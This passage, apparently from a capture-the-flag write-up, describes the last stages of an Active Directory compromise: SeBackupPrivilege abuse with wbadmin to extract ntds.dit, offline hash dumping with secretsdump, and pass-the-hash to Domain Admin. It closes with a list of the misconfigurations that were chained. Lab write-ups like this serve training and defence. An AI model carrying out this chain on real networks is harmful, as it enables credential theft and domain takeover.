10. **SeBackupPrivilege abuse**: `svc_backup` had `SeBackupPrivilege`/`SeRestorePrivilege`. Direct file copy of the locked `ntds.dit` failed, so used **`wbadmin`** to run a VSS-based backup of `C:\Windows\NTDS` to an attacker-controlled SMB share, then recovered `ntds.dit` from that backup version alongside a saved `SYSTEM` hive.
11. **Offline secrets dump**: Ran **impacket-secretsdump** against the downloaded `ntds.dit` + `SYSTEM` → full domain NTLM hash dump, including **Administrator**.
12. **Domain Admin**: Pass-the-hash as **Administrator** over WinRM → `root.txt`.

### Key Vulnerabilities Chained
- Guest/anonymous SMB access enabled, exposing readable shares and a profile-folder-based username oracle
- AS-REP Roastable account (`support`) with a crackable, weak password
- Excessive/misconfigured AD ACLs — `support` had `ForceChangePassword` rights over `audit2020`
- Sensitive forensic artifacts (LSASS memory dumps) left exposed on an accessible SMB share
- Overly broad privileged rights (`SeBackupPrivilege`) granted to a low-value service account, enabling a full NTDS.dit extraction and complete domain compromise via pass-the-hash
